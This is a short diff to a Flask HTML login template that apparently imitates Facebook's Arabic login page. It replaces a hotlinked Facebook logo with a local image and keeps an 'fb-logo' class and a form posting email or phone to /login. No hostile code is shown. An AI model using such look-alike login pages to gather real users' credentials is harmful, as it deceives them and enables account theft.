@@ -109,7 +109,7 @@
 </head>
 <body>
   <div class="container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook" class="fb-logo">
+    <img src="{{ url_for('static', filename='logo.png') }}" alt="Logo" class="fb-logo">
 
     <form action="/login" method="POST">
       <input type="text" name="email" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
@@ -129,4 +129,5 @@
   </div>
 </body>
 </html>
+
 
